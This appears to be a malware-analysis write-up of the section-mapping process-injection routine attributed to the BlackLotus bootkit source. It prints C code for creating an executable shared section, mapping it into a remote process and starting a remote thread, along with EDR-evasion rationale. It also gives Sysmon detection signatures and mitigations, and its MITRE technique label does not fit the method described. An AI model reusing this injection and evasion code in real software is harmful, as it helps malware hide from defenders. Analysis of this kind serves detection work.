# BlackLotus UEFI Bootkit - Section Mapping Injection via Shared Memory

**Repository:** `MalwareSourceCode-main`  
**File:** `Win32/Rootkits/Win32.Bootkit.BlackLotus.b/src/Shared/injection.c`  
**Language:** C (Usermode with UEFI bootkit context)  
**MITRE ATT&CK:** T1055.011 (Process Injection: Extra Window Memory Injection)

## Overview

BlackLotus, the first UEFI bootkit to bypass Secure Boot (2022), implements section-based injection using Windows section objects (file mapping) for shared memory injection. Unlike traditional `VirtualAllocEx` + `WriteProcessMemory`, BlackLotus creates a memory-mapped section that can be mapped into both local and remote processes, avoiding direct memory writes heavily monitored by EDR solutions.

**Key Advantages:**
- **No WriteProcessMemory**: Avoids the most monitored cross-process memory API
- **Shared Memory**: Section exists in both processes without explicit cross-process writes
- **Executable Permissions**: Sections created with `PAGE_EXECUTE_READWRITE` directly
- **Reduced Telemetry**: Fewer suspicious API calls compared to classic injection

## Section Object Creation and Mapping

```c
LPVOID InjectCode(HANDLE Process, LPVOID Function)
{
    // Get PE image base and size
    LPVOID Base = GetImageBase(Function);
    PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)Base + ((PIMAGE_DOS_HEADER)Base)->e_lfanew);
    SIZE_T Size = NtHeaders->OptionalHeader.SizeOfImage;

    // Create anonymous section with RWX permissions
    Map = CreateFileMappingW(
        INVALID_HANDLE_VALUE,        // Pagefile-backed (anonymous)
        NULL,
        PAGE_EXECUTE_READWRITE,      // Executable memory section
        0,
        (DWORD)Size,                 // Size of PE image
        NULL                         // Unnamed section
    );

    // Map into LOCAL process for writing
    View = MapViewOfFile(Map, FILE_MAP_WRITE, 0, 0, 0);
    
    // Copy PE image to shared section
    memcpy(View, Base, Size);
    
    // Apply relocations for new base address
    ApplyRelocations(View, (ULONG_PTR)View - (ULONG_PTR)Base, RelocationDirectory);
    
    UnmapViewOfFile(View);  // Unmap from local process
}
```

**Technical Details:**

- **CreateFileMappingW**: Creates section object with `INVALID_HANDLE_VALUE` (pagefile-backed, no backing file)
- **PAGE_EXECUTE_READWRITE**: Section permissions bypass need for `VirtualProtect` later
- **MapViewOfFile**: Maps section into local process with `FILE_MAP_WRITE` access for PE copying
- **Relocation Processing**: Adjusts PE relocations for new base address before remote mapping

## Remote Process Section Mapping

After local PE copying and relocation, BlackLotus maps the same section into the target process:

```c
// Map section into REMOTE process at arbitrary address chosen by kernel
ViewSize = 0;  // Kernel chooses size
NewBaseAddress = NULL;  // Kernel chooses base address
Status = NtMapViewOfSection(
    Map,                    // Section handle (already contains PE)
    Process,                // Target process handle
    &NewBaseAddress,        // OUT: kernel-selected address in remote process
    0,                      // Zero bits (address constraint)
    0,                      // Commit size (0 = entire section)
    NULL,                   // Section offset (NULL = start of section)
    &ViewSize,              // OUT: size of mapped view
    ViewUnmap,              // Inherit disposition (unmap on child process creation)
    0,                      // Allocation type
    PAGE_EXECUTE_READ       // Protection (downgrade to RX after mapping)
);

CloseHandle(Map);  // Close section handle after mapping complete
```

**Critical Behavior:**

1. **NtMapViewOfSection**: Direct syscall bypasses `MapViewOfFile` kernel32 hooking
2. **Kernel Address Selection**: `NewBaseAddress=NULL` allows kernel to choose ASLR-compliant address
3. **Protection Downgrade**: Maps as `PAGE_EXECUTE_READ` (RX) instead of RWX to reduce suspicion
4. **No WriteProcessMemory**: PE code now exists in remote process without explicit memory writes
5. **Remote Thread Creation**: `CreateRemoteThread(Process, NULL, 0, NewBaseAddress + FunctionRva, NULL, 0, NULL)`

## Thread Creation and Execution

BlackLotus calculates the RVA (Relative Virtual Address) of the target function and creates a remote thread:

```c
// Calculate function offset from module base
DWORD FunctionRva = (DWORD)((LPBYTE)Function - (LPBYTE)Base);

// Create thread in remote process starting at mapped section + function offset
HANDLE Thread = CreateRemoteThread(
    Process,                           // Target process handle
    NULL,                             // Default security attributes
    0,                                // Default stack size
    (LPTHREAD_START_ROUTINE)(NewBaseAddress + FunctionRva),  // Entry point in remote process
    NULL,                             // No thread parameter
    0,                                // Run immediately (not suspended)
    NULL                              // Don't retrieve thread ID
);

CloseHandle(Thread);
```

## Detection and Evasion

**Sysmon Detection Signatures:**

1. **Event ID 10** (Process Access): Process opening with `PROCESS_VM_OPERATION` + `PROCESS_CREATE_THREAD`
2. **Event ID 8** (CreateRemoteThread): Thread creation with start address outside known DLLs
3. **Event ID 7** (Image Loaded): No corresponding image load event for execution address (section mapping doesn't trigger this)

**Evasion Techniques:**

- **Section-Based Injection**: Avoids `WriteProcessMemory` (Sysmon Event ID 10 with `PROCESS_VM_WRITE`)
- **Direct Syscalls**: `NtMapViewOfSection` bypasses usermode hooking by EDR
- **Anonymous Sections**: Pagefile-backed sections leave minimal forensic artifacts (no file on disk)
- **RX Permissions**: Downgrades from RWX to RX after mapping, avoiding "RWX memory" behavioral alerts

**Behavioral Indicators:**

```
Process A calls CreateFileMappingW(INVALID_HANDLE_VALUE, PAGE_EXECUTE_READWRITE)
AND
Process A calls NtMapViewOfSection(target_process_handle)
AND
Process A calls CreateRemoteThread(target_process_handle, section_base_address)
WITHIN 60 seconds
= High-confidence section mapping injection
```

## Mitigation

1. **EDR Syscall Monitoring**: Hook `NtMapViewOfSection` to detect suspicious section mapping into remote processes
2. **Memory Scanning**: Periodic scans for unbacked executable memory (sections with no corresponding file on disk)
3. **WDAC/AppLocker**: Enforce code integrity policies to prevent unsigned code execution from pagefile-backed sections
4. **Kernel Callbacks**: Use `PsSetCreateProcessNotifyRoutineEx` to monitor section object creation with executable permissions

**Key Differentiator**: Section mapping injection eliminates the need for `WriteProcessMemory`, a heavily monitored API, by using shared memory objects that naturally exist in both processes. This technique generates significantly less EDR telemetry than classic injection methods while maintaining full code execution capabilities.
